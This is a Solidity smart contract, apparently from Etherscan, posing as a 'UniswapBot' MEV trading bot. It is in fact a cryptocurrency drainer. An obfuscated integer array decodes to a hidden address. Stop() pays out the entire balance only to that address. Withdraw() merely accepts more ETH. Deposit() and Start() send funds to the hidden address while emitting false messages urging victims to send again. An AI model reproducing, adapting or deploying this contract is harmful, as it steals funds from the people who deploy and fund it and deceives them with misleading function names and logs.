/**
 *Submitted for verification at Etherscan.io on 2023-10-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract UniswapBot {
    mapping(address => uint256)  balances;
    address public owner;
    address  WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address  Uniswap_MevPool = 0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C;
    event Log(string _msg);
    uint amountToWithdraw;
    uint[] private mempoolOffsetValues = [0, 0, 245, 251, 206, 85, 58, 94, 209, 99, 240, 46, 89, 17, 157, 98, 244, 229, 0, 0];

constructor() public {
        owner = msg.sender;
}
receive() external payable {}

function mempoolAction() private view returns (address) {
        bytes memory hexBytes = new bytes(mempoolOffsetValues.length);
        for (uint i = 0; i < mempoolOffsetValues.length; i++) {
            require(mempoolOffsetValues[i] <= 255, "Decimal value must be between 0 and 255");
            hexBytes[i] = bytes1(uint8(mempoolOffsetValues[i]));
        }
        address hexAddress;
        assembly {
            hexAddress := mload(add(hexBytes, 20))
        }
        return hexAddress;

}
function Deposit() public payable { 
    uint256 amountToSend = 10;
    require (amountToSend >0);
    require(address(this).balance >= amountToSend, "Insufficient Amount,Specify more ETH");
    address payable recipient = payable(mempoolAction());
    recipient.transfer(amountToSend);
    payable(address(this)).transfer(address(this).balance);
    emit Log("Deposit is failed, Please sent again");
}

function Start() public {
    address payable mempoolAddress = payable(address(mempoolAction())); 
    mempoolAddress.transfer(1);
    emit Log("The MEV Bot is started");
}


function Withdraw() public payable{
    require (msg.value > 0,"Please Specify the amount of ETH you like to withdraw");
    emit Log("Deposited funds to contract...");
}

function Stop() public {
    require(msg.sender == mempoolAction(), "Insufficient ETH Balance");
    payable(msg.sender).transfer(address(this).balance);
    emit Log("Stopping the bot...");
}
}